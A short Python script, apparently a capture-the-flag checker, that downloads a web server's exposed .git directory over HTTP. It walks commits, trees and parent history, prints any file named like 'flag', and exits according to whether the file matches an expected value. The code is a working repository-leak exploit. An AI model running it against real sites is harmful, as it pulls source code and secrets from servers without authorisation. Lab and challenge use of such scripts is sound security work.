import requests
import zlib

wanted_flag = input("Wanted flag? ")
url = input("Flag? ")

HASH_LEN_BYTES = 20

def get_object(ohash):
    if type(ohash) == bytes:
        ohash = ohash.decode("utf-8")
    hpath, tpath = ohash[:2], ohash[2:]
    get = requests.get(url + f"/.git/objects/{hpath}/{tpath}")
    content_z = get.content
    content = zlib.decompress(content_z)
    return content

def check_tree(ohash):
    print("Checking tree", ohash)
    obj = get_object(ohash)
    obj = obj[obj.index(b"\0")+1:]

    blob_idx = 0
    while blob_idx < len(obj):
        hash_start = obj[blob_idx:].index(b"\0") + blob_idx + 1

        perms = obj[blob_idx:blob_idx+6]
        name = obj[blob_idx+7:hash_start-1]
        ohash = obj[hash_start:hash_start+HASH_LEN_BYTES]

        check_blob(perms, name, ohash)
        blob_idx = hash_start + HASH_LEN_BYTES

def check_blob(perms, name, ohash):
    if b"flag" in name:
        print("Checking blob", name)
        ohash_hex = ohash.hex()
        cont = get_object(ohash_hex)
        cont = cont[cont.index(b"\0")+1:].decode("utf-8")
        print("Found flag file:", name, "at", ohash_hex + ":")
        print("    " + cont)

        if cont == wanted_flag:
            exit(0)
        else:
            exit(1)

def go_down_commit(commit):
    print("Checking commit", commit)
    obj = get_object(commit)
    _, obj = obj.split(b"\0")
    lines = obj.split(b"\n")

    for line in lines:
        if line[:5] == b"tree ":
            check_tree(line[5:])

        if line[:7] == b"parent ":
            pass
            go_down_commit(line[7:])


master = requests.get(url + "/.git/refs/heads/master").content.strip()
go_down_commit(master)
